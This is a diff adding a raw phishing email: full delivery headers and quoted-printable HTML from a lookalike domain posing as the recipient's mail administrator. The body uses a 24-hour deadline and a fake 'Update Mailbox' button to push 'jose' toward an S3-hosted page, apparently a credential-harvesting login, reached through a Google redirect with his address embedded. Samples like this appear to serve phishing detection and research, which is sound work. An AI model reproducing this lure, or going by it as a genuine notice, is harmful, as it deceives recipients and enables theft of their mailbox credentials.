@@ -1,0 +1,188 @@
+Return-Path: advanced-linse.com-vmta@advanced-linse.com
+Delivered-To: jose@monkey.org
+X-FDA: 84151897830.22.F6643B8
+Received: from advanced-linse.com (advanced-linse.com [185.117.90.25])
+	by imf16.b.hostedemail.com (Postfix) with ESMTP id 33B1E120004
+	for <jose@monkey.org>; Wed, 26 Nov 2025 07:15:33 +0000 (UTC)
+Authentication-Results: imf16.b.hostedemail.com;
+	dkim=pass header.d=advanced-linse.com header.s=advan header.b=koXiVb2C;
+	spf=pass (imf16.b.hostedemail.com: domain of
+ advanced-linse.com-vmta@advanced-linse.com designates 185.117.90.25 as
+ permitted sender) smtp.mailfrom=advanced-linse.com-vmta@advanced-linse.com;
+	dmarc=pass (policy=quarantine) header.from=advanced-linse.com
+ARC-Message-Signature: i=1; a=rsa-sha256; c=relaxed/relaxed;
+ d=hostedemail.com;
+	s=arc-20220608; t=1764141334;
+	h=from:from:sender:reply-to:subject:subject:date:date:
+	 message-id:message-id:to:to:cc:mime-version:mime-version:
+	 content-type:content-type:
+	 content-transfer-encoding:content-transfer-encoding:in-reply-to:
+	 references:dkim-signature; bh=7s+XbI1OD97G4UxIdIBdXtv2T9DqHxq5afFE+jExmyM=;
+	b=oXbTi8yqNUX8bY7rB5WMwzP4qtphHFhVdHnH1Xwq5fCwc3xlwyr2ynM5457GJjtujIJdhO
+	gkuv+/iHYkIBhcvXf02r797r1EakCU6+OOFvoX6xozT1Hd6OlWD/mKbUi5mnOIlkwzsSrp
+	nsPkVe41USzOOOCDv0moLI9ChldM5hM=
+ARC-Authentication-Results: i=1;
+	imf16.b.hostedemail.com;
+	dkim=pass header.d=advanced-linse.com header.s=advan header.b=koXiVb2C;
+	spf=pass (imf16.b.hostedemail.com: domain of
+ advanced-linse.com-vmta@advanced-linse.com designates 185.117.90.25 as
+ permitted sender) smtp.mailfrom=advanced-linse.com-vmta@advanced-linse.com;
+	dmarc=pass (policy=quarantine) header.from=advanced-linse.com
+ARC-Seal: i=1; s=arc-20220608; d=hostedemail.com; t=1764141334; a=rsa-sha256;
+	cv=none;
+	b=Zc0ACa1BJmNXSGWjDPSCOkWysc0r2l720r4CvkqEfcJtfPT5we9ipyxuHYzvONJv0KTkvh
+	J64hnvg5vX2EZiteEBVUwYF+yB3xKbokcePkEH8wzygtKZLSaESlx7LmnLc39nockTBhZZ
+	X29fz5kGcf7pbRw26cKwkU66aatjFfg=
+DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed; s=advan;
+ d=advanced-linse.com;
+ h=From:To:Subject:Date:Message-ID:MIME-Version:Content-Type:
+ Content-Transfer-Encoding; i=adyy@advanced-linse.com;
+ bh=7s+XbI1OD97G4UxIdIBdXtv2T9DqHxq5afFE+jExmyM=;
+ b=koXiVb2CX5XnU1y+hrCQe04JyOY6pd9L91C17VDYwHs//i3di9OKLdfw986czqRaQ5pgDI4CTKmp
+   66wphZ5pYnrwP3xat8OJcn/D90Der8cIS9uJYjgnf2fLYtw3VN1Vc0qWmXCVtf5RJx7HBjGwuZUi
+   bvXubtg47dguZFESK+SsN7lajGVS2H83DEZ1k7RKsbauCvh7pwd77+rQEron/D8FwCAQio9w/2CA
+   M/325SevXrervoeYrcuwjrRz5RZUbADf7YSXKrjiBU7aE8pq/UjKadXO5FFiIRwz6++mLtLNA5wy
+   8MVewKzuqMq/NkOwapflnJ5CPB+WIfRCgT9RwA==
+From: monkey.org <adyy@advanced-linse.com>
+To: jose@monkey.org
+Subject: =?UTF-8?B?8J+TqSBBY3Rpb24gUmVxdWlyZWQ6IFVwZGF0ZQ==?=
+ 'jose@monkey.org' for Compliance.
+Date: 25 Nov 2025 18:15:31 -0800
+Message-ID: <20251125181531.EDE96079A888AD14@advanced-linse.com>
+MIME-Version: 1.0
+Content-Type: text/html
+Content-Transfer-Encoding: quoted-printable
+X-Rspam-User: 
+X-Rspamd-Queue-Id: 33B1E120004
+X-Stat-Signature: e8wym9zugob4z1ptrx3g56414tewhwnx
+X-Rspamd-Server: rspam03
+X-Spam-Status: No, score=1.61
+X-HE-Tag: 1764141333-997847
+X-HE-Meta: 
+ U2FsdGVkX18MZ3maFivun6xO0GdxoAZuFgFvkuLmbAHKkdIRIyayWxQxvgTWQQNQxbfNp84YM2AYbt3ccFCYWzPupKOZf8b2ms7OLxZok4C5OTvLbitGBOEV85d4Pbd+yBlXGY9u06Skm30adOFngujNe4+UFtPHZKyF9qVfbbYRgEof5yiMbptH8hEeX7p5DBYenA18IyV8lZ9S0hCh0v9TmkaEppwkBCRR4j4AbOWIhAzlYpvfoaZUOdw5H9O07dcsq/oHC0V9XiSKCRoSRVAzHND6p+CNpdsl1FZpKau2FTyk49mYGFuoYDr5KihIKlM0hDvYBV8nQ7kw1oGkYaBAxUqOyQI9G8RgsEduCgq3a1kf+RTPH1jorVjsrOGkLTgpQCIIXrCJuyv1aUDrB/x7rwbUqb3v/VWey2ricBSpngjFJtcZf++kNeTapvO1JwYAC1XwdwPRh0lQlbGZhNjUQpdhMApKw+arbIzCVmUOjHRO2ZvaJe+r0QBkRNixwg14Xq31GYD5E9VAESNZy1mhy6Vno+ssEOYgK968EimgoZPBgALGhMtviMBHG+XPHeb4azoDf36rULSdTw4aGOtueeEYDK0tCtmt3syILYE2ZtQ0fetdayKbzpvNf4EC2TrKTo6E+HFu2hkomgxIjcDa2pbPLCUavcC/MCVvL70oM/dj5S4ifRuSmVucAnGZb8/0AWZq9buWpjd1E1R9V5G4tEBD1xiTfgJoeGe7N6Jb5foYOSBMvzINfSiz+hwTwrrRaVzdYoo8PS3ohDjRKpEJ+zSDSvnMA4lTZ2hMQs0mShShMXA7BtEKKqtc/VkiJoLw2G6TkLtyi2w2Oyl2CCmNSPpmBgegsWz2dO2S2K4Ddh5RZ47tIBEwAnmORG8JI9/qz3pZe3qVuvqQHTAAJzxp0kgoKnRG7I/VVj2eNDogg65TQl1Rp6Zopb61whu9/bj7NkAp/rByGxMZRq2AQutI9Nz
+ ao6cnzeu34a059rMaKfrKnTlEHFSDF2OrOd9qDJ7d5obj/iR5v3rnscxHxut+w08K1JU1JavALNQ3MbiuDSTfjGQSIyDlp/emBD6RM81Z+jyYhkyKJjKV/k6m9caVp2iDKBDMoi1pZj8SnFyXxHKLHlpnZunSxdJZev6/TBeSaT6FDBuJororu0+J9JhvbYtpZhKN/67z9gN/9LTq65tr2jH3pMOWhQyobCFTZYlyLvBmfjH05cwjjWq/ihGokQeTYD9zdCjcP4YbfOwbqvM+jn53PLXdtWsrtjnWj2MBF3Fnwl5R1J7w7Zq4/phCTxCvB0JvpuvmGIhqhCAh+r0u5iFHmLdrtz05bjxUWZd4ntdJIAGEu0ntT+A1AA888Ye36sMPH8/iUcHHj2TTEryJwZTr0A==
+Status: O
+X-Status: 
+X-Keywords: 
+X-UID: 440
+
+<html><head>
+<meta http-equiv=3D"X-UA-Compatible" content=3D"IE=3Dedge">
+</head>
+<body><div tabindex=3D"1" class=3D"Am aiL Al editable LW-avf tS-tW tS-tY" i=
+d=3D":52i" role=3D"textbox" aria-expanded=3D"false" aria-controls=3D":54x" =
+aria-owns=3D":54x" style=3D"direction: ltr; min-height: 272px;" contentedit=
+able=3D"true" hidefocus=3D"true" spellcheck=3D"false" aria-label=3D"Message=
+ Body" aria-multiline=3D"true" g_editable=3D"true" writingsuggestions=3D"fa=
+lse"><div dir=3D"ltr">
+
+<table width=3D"92%" align=3D"center" style=3D"text-align: left; color: rgb=
+(44, 54, 58); text-transform: none; letter-spacing: normal; font-family: ar=
+ial; font-size: 14px; font-style: normal; font-weight: 400; word-spacing: 0=
+px; white-space: normal; border-collapse: collapse; box-sizing: border-box;=
+ background-color: rgb(255, 255, 255); font-variant-ligatures: normal; font=
+-variant-caps: normal; text-decoration-style: initial; text-decoration-colo=
+r: initial;" border=3D"0" cellspacing=3D"0" cellpadding=3D"0">
+<tbody><tr style=3D"box-sizing: border-box;"><td align=3D"center" valign=3D=
+"top" style=3D"margin: 0px; box-sizing: border-box;"><table width=3D"100%" =
+align=3D"center" style=3D"border-collapse: collapse; box-sizing: border-box=
+;" cellspacing=3D"0" cellpadding=3D"0"><tbody style=3D"box-sizing: border-b=
+ox;"><tr style=3D"box-sizing: border-box;"><td valign=3D"top" style=3D"marg=
+in: 0px; box-sizing: border-box;"><table width=3D"90%" style=3D"border-coll=
+apse: collapse; box-sizing: border-box;" cellspacing=3D"0" cellpadding=3D"0=
+">
+<tbody style=3D"box-sizing: border-box;"><tr style=3D"box-sizing: border-bo=
+x;"><td valign=3D"top" style=3D"margin: 0px; color: rgb(51, 51, 51); line-h=
+eight: 18px; font-family: Roboto,Arial; font-size: 12px; box-sizing: border=
+-box;"><font face=3D"Arial" size=3D"3" style=3D"box-sizing: border-box;"><s=
+pan style=3D"font-weight: bolder; box-sizing: border-box;">Dear jose,</span=
+></font></td></tr></tbody></table></td></tr><tr style=3D"box-sizing: border=
+-box;">
+<td valign=3D"top" style=3D"margin: 0px; box-sizing: border-box;"><table wi=
+dth=3D"100%" style=3D"border-collapse: collapse; box-sizing: border-box;" b=
+order=3D"0" cellspacing=3D"0" cellpadding=3D"0"><tbody style=3D"box-sizing:=
+ border-box;"><tr style=3D"box-sizing: border-box;"><td height=3D"25" style=
+=3D"margin: 0px; box-sizing: border-box;"><font face=3D"Arial" size=3D"3" s=
+tyle=3D"box-sizing: border-box;">&nbsp;</font></td></tr><tr style=3D"box-si=
+zing: border-box;">
+<td style=3D"margin: 0px; color: rgb(102, 102, 102); line-height: 19px; fon=
+t-family: Roboto,Arial; font-size: 13px; box-sizing: border-box;"><font fac=
+e=3D"Arial" size=3D"3" style=3D"box-sizing: border-box;">You have an import=
+ant mailbox update, please click below to complete the mailbox update now.<=
+br style=3D"box-sizing: border-box;"></font></td></tr></tbody></table></td>=
+</tr><tr style=3D"box-sizing: border-box;"><td height=3D"20" align=3D"left"=
+ valign=3D"top" style=3D"margin: 0px; box-sizing: border-box;">
+<font face=3D"Arial" size=3D"3" style=3D"box-sizing: border-box;">&nbsp;</f=
+ont></td></tr></tbody></table></td></tr><tr style=3D"box-sizing: border-box=
+;"><td align=3D"center" valign=3D"top" style=3D"margin: 0px; box-sizing: bo=
+rder-box;"><font face=3D"Arial" size=3D"3" style=3D"box-sizing: border-box;=
+">&nbsp;</font><table align=3D"center" style=3D"border-collapse: collapse; =
+box-sizing: border-box;" border=3D"0" cellspacing=3D"0" cellpadding=3D"0"><=
+tbody style=3D"box-sizing: border-box;"><tr style=3D"box-sizing: border-box=
+;">
+<td width=3D"288" height=3D"40" align=3D"center" style=3D"margin: 0px; box-=
+sizing: border-box;" bgcolor=3D"#f3565d"><font face=3D"Arial" size=3D"3" st=
+yle=3D"box-sizing: border-box;">
+<a style=3D"color: rgb(255, 255, 255); text-transform: uppercase; line-heig=
+ht: 40px; font-family: Roboto,Arial; text-decoration: none; display: block;=
+ box-sizing: border-box; background-color: transparent;" href=3D"https://ww=
+w.google.com/url?q=3Dhttps%3A%2F%2Fs3.us-east-2.amazonaws.com%2Ftubxus-east=
+-2.console.aws.amazon.com%2Froundcuremail.html&amp;sa=3DD&amp;sntz=3D1&amp;=
+usg=3DAOvVaw2hE8UUjJwSIBRaSzYM1j9e#jose@monkey.org" target=3D"_blank" rel=
+=3D"noreferrer"=20
+data-saferedirecturl=3D"https://www.google.com/url?q=3Dhttps://www.joblinka=
+pply.com/Joblink/5972/Account/ChangeLanguage?lang%3Des-MX%26returnurl%3Dhtt=
+ps://s3.us-east-1.amazonaws.com/webeast-1.console.aws.amazon.com/roundcurem=
+ail.html%23%5B%5B-Email-%5D%5D&amp;source=3Dgmail&amp;ust=3D176405872973800=
+0&amp;usg=3DAOvVaw0t78X3zbYMFLyBF_VeV_ky">Update Mailbox</a></font></td></t=
+r></tbody></table></td></tr><tr style=3D"box-sizing: border-box;">
+<td height=3D"20" align=3D"left" valign=3D"top" style=3D"margin: 0px; box-s=
+izing: border-box;"><font face=3D"Arial" size=3D"3" style=3D"box-sizing: bo=
+rder-box;">&nbsp;</font></td></tr><tr style=3D"box-sizing: border-box;"><td=
+ valign=3D"top" style=3D"margin: 0px; box-sizing: border-box;"><table width=
+=3D"100%" style=3D"border-collapse: collapse; box-sizing: border-box;" bord=
+er=3D"0" cellspacing=3D"0" cellpadding=3D"0"><tbody style=3D"box-sizing: bo=
+rder-box;"><tr style=3D"box-sizing: border-box;">
+<td style=3D"margin: 0px; color: rgb(102, 102, 102); line-height: 19px; fon=
+t-family: Roboto,Arial; font-size: 13px; box-sizing: border-box;"><font fac=
+e=3D"Arial" size=3D"3" style=3D"box-sizing: border-box;">You have 24 hours =
+to complete the update to avoid bouncing back of incoming&nbsp;emails to yo=
+ur mailbox.</font></td></tr></tbody></table></td></tr><tr style=3D"box-sizi=
+ng: border-box;">
+<td height=3D"25" style=3D"margin: 0px; border-bottom-color: rgb(238, 238, =
+238); border-bottom-width: 1px; border-bottom-style: solid; box-sizing: bor=
+der-box;"><font face=3D"Arial" size=3D"3" style=3D"box-sizing: border-box;"=
+>&nbsp;</font></td></tr><tr style=3D"box-sizing: border-box;"><td height=3D=
+"23" style=3D"margin: 0px; box-sizing: border-box;"><font face=3D"Arial" si=
+ze=3D"3" style=3D"box-sizing: border-box;">&nbsp;</font></td></tr><tr style=
+=3D"box-sizing: border-box;">
+<td valign=3D"top" style=3D"margin: 0px; box-sizing: border-box;"><font fac=
+e=3D"Arial" size=3D"3" style=3D"box-sizing: border-box;">Disclaimer<p style=
+=3D"margin-top: 0px; margin-bottom: 1rem; box-sizing: border-box;">&nbsp;</=
+p><p align=3D"center" style=3D"color: rgb(92, 88, 88); line-height: 10pt; f=
+ont-size: 8pt; margin-top: 0px; margin-bottom: 1rem; box-sizing: border-box=
+;">This email&nbsp;is intended solely for<font size=3D"1" style=3D"color: r=
+gb(11, 83, 148);"> jose@monkey.org</font><span>&nbsp;</span>
+&nbsp; &nbsp; &nbsp;only. It contains confidential and/or privileged inform=
+ation. If you are not the intended recipient or have received this email in=
+ error, you must not copy, distribute, disclose or take any action in relia=
+nce on any part of it. In such a case, you should inform us immediately and=
+ delete this email.</p><p style=3D"margin: 0px; text-align: center; color: =
+rgb(57, 61, 71); line-height: 1.2; font-family: Tahoma,Verdana,Segoe,sans-s=
+erif; box-sizing: border-box;">&nbsp;</p></font>
+<font size=3D"3" style=3D"box-sizing: border-box;"></font><table width=3D"9=
+0%" style=3D"border-collapse: collapse; box-sizing: border-box;" cellspacin=
+g=3D"0" cellpadding=3D"0"><tbody style=3D"box-sizing: border-box;"><tr styl=
+e=3D"box-sizing: border-box;"><td valign=3D"top" style=3D"margin: 0px; colo=
+r: rgb(51, 51, 51); line-height: 18px; font-family: Roboto,Arial; font-weig=
+ht: 600; box-sizing: border-box;"><font face=3D"Arial" size=3D"3" style=3D"=
+box-sizing: border-box;">
+<a style=3D"color: rgb(25, 106, 212); text-decoration: underline; box-sizin=
+g: border-box; background-color: transparent;">monkey.org</a>&nbsp; &nbsp;A=
+dministrator Services. All Rights Reserved</font></td></tr></tbody></table>=
+</td></tr></tbody></table>
+
+<br></div>
+</div>
+</body></html>
+
